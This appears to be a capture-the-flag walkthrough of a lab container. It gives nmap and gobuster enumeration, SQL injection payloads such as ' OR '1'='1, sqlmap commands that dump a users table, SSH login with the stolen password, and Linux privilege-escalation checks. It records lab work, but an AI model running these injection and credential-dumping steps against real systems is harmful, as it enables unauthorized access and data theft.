# IP
172.17.0.2
# Ports scanning
```sh
sudo nmap -p- -sS -sV -sC -T4 -n --min-rate 5000 172.17.0.2

Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-18 12:21 -0300
Nmap scan report for 172.17.0.3
Host is up (0.0000030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Iniciar Sesi\xC3\xB3n
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
MAC Address: 9E:F0:93:79:AA:11 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.03 seconds
```

Discovered two open ports
- 22 running SSH
- 80 running a web service in Apache
# Web enum
## Dir fuzzing
```sh
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,conf,sh,txt,sql,zip,md

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              sql,zip,md,php,html,conf,sh,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.conf            (Status: 403) [Size: 275]
.hta.sql             (Status: 403) [Size: 275]
.hta.zip             (Status: 403) [Size: 275]
.hta                 (Status: 403) [Size: 275]
.hta.txt             (Status: 403) [Size: 275]
.hta.md              (Status: 403) [Size: 275]
.hta.sh              (Status: 403) [Size: 275]
.hta.php             (Status: 403) [Size: 275]
.htaccess            (Status: 403) [Size: 275]
.hta.html            (Status: 403) [Size: 275]
.htaccess.md         (Status: 403) [Size: 275]
.htaccess.html       (Status: 403) [Size: 275]
.htaccess.php        (Status: 403) [Size: 275]
.htaccess.conf       (Status: 403) [Size: 275]
.htaccess.sh         (Status: 403) [Size: 275]
.htaccess.txt        (Status: 403) [Size: 275]
.htaccess.sql        (Status: 403) [Size: 275]
.htaccess.zip        (Status: 403) [Size: 275]
.htpasswd            (Status: 403) [Size: 275]
.htpasswd.php        (Status: 403) [Size: 275]
.htpasswd.html       (Status: 403) [Size: 275]
.htpasswd.conf       (Status: 403) [Size: 275]
.htpasswd.sh         (Status: 403) [Size: 275]
.htpasswd.sql        (Status: 403) [Size: 275]
.htpasswd.txt        (Status: 403) [Size: 275]
.htpasswd.md         (Status: 403) [Size: 275]
.htpasswd.zip        (Status: 403) [Size: 275]
config.php           (Status: 200) [Size: 0]
index.php            (Status: 200) [Size: 2921]
index.php            (Status: 200) [Size: 2921]
server-status        (Status: 403) [Size: 275]
Progress: 41517 / 41517 (100.00%)
===============================================================
Finished
===============================================================
```
## Login page
![[Pasted image 20260918123055.png]]

When trying basic SQLI
```sh
curl -i -X POST http://172.17.0.2 -d "name=%27+OR+1%3D1+%27&password=%27+OR+1%3D1+%27&submit=" | grep SQLSTATE

SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' AND passwd = '' OR 1=1 ''' at line 1        </div>
```
## SQLMAP
```sh
sqlmap -u http://172.17.0.2/index.php --data="name=admin&password=123&submit=" --dbms=MariaDB --dbs --batch

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] register
[*] sys
```

```sh
sqlmap -u http://172.17.0.2/index.php --data="name=admin&password=123&submit=" --dbms=MariaDB -D register --tables --batch

Database: register
[1 table]
+-------+
| users |
+-------+
```

```sh
sqlmap -u http://172.17.0.2/index.php --data="name=admin&password=123&submit=" --dbms=MariaDB -D register -T users --dump --batch

Database: register
Table: users
[1 entry]
+------------------+----------+
| passwd           | username |
+------------------+----------+
| KJSDFG789FGSDF78 | dylan    |
+------------------+----------+
```

(Could also login with payload: *'  OR '1'='1* in the password input with any input in the name field, this means validation was something like: SELECT * FROM users WHERE name = 'dylan' AND password = '$input')
# SSH login
```sh
ssh dylan@172.17.0.2
dylan@172.17.0.2's password: KJSDFG789FGSDF78
```
# Privilege escalation

## SUID
``` sh
dylan@7d5b62548eb0:~$ find / -perm -4000 2>/dev/null
/usr/bin/chsh
/usr/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```
## SGID
```
dylan@7d5b62548eb0:~$ find / -perm -2000 2>/dev/null
/var/local
/var/log/mysql
/var/log/journal
/var/mail
/usr/bin/chage
/usr/bin/wall
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
```
## Sticky bit
```
dylan@7d5b62548eb0:~$ find / -perm -1000 2>/dev/null
/proc/acpi
/proc/asound
/dev/shm
/dev/mqueue
/tmp
/var/lib/php/sessions
/var/tmp
/run/lock
/sys/firmware
```

## Misconfigured sudo
``` sh
dylan@7d5b62548eb0:~$ sudo -l
bash: sudo: command not found
```

## Cron jobs
```sh
dylan@7d5b62548eb0:~$ cat /etc/crontab
cat: /etc/crontab: No such file or directory
dylan@7d5b62548eb0:~$ crontab -l
bash: crontab: command not found
```
## Writable files
```sh
dylan@7d5b62548eb0:~$  find / -writable -type f 2>/dev/null | grep -v proc
/home/dylan/.profile
/home/dylan/.bashrc
/home/dylan/.bash_logout
/home/dylan/.cache/motd.legal-displayed
```
## Process
```sh
ps auxwww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4372  3172 ?        Ss   18:06   0:00 /bin/bash -c service ssh start ; service apache2 start ; sed -i 's/^bind-address.*=.*127.0.0.1/bind-address = 0.0.0.0/' /etc/mysql/mariadb.conf.d/50-server.cnf ; service mariadb start ; while true; do echo 'Alive'; sleep 60; done
root          15  0.0  0.1  15444  5740 ?        Ss   18:06   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          34  0.0  0.5 200324 21948 ?        Ss   18:06   0:00 /usr/sbin/apache2 -k start
www-data      39  0.0  0.2 200656 11828 ?        S    18:06   0:00 /usr/sbin/apache2 -k start
www-data      40  0.0  0.2 200656 11828 ?        S    18:06   0:00 /usr/sbin/apache2 -k start
www-data      41  0.0  0.2 200656 11828 ?        S    18:06   0:00 /usr/sbin/apache2 -k start
www-data      42  0.0  0.2 200656 11828 ?        S    18:06   0:00 /usr/sbin/apache2 -k start
www-data      43  0.0  0.2 200656 11828 ?        S    18:06   0:00 /usr/sbin/apache2 -k start
root          74  0.0  0.0   2900  1956 ?        S    18:06   0:00 /bin/sh /usr/bin/mysqld_safe
mysql        171  0.0  2.2 1338348 91616 ?       Sl   18:06   0:00 /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld.sock
root         172  0.0  0.0   6200  2780 ?        S    18:06   0:00 logger -t mysqld -p daemon error
root         220  0.0  0.2  17176 10980 ?        Ss   18:06   0:00 sshd: dylan [priv]
dylan        231  0.0  0.2  17176  8112 ?        R    18:06   0:00 sshd: dylan@pts/0
dylan        232  0.0  0.1   5056  4112 pts/0    Ss   18:06   0:00 -bash
dylan        240  0.0  0.1   5056  4092 pts/0    S    18:07   0:00 /bin/bash -p
root         370  0.0  0.0   2800  1536 ?        S    18:21   0:00 sleep 60
dylan        372  0.0  0.0   7492  3236 pts/0    R+   18:21   0:00 ps auxwww
```
## DB config
```sh
cat /var/www/html/config.php
<?php
return [
        'db' => [
                'host' => 'localhost',
                'user' => 'root',
                'passwd' => 'paso',
                'dbname' => 'register',
                'options' => [
                        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
                ]
        ]
];
?>
```

# ⚠️
In other people writeups the escalation path uses SUID with /usr/bin/env but we couln't find it. We'll asume there's no further escalation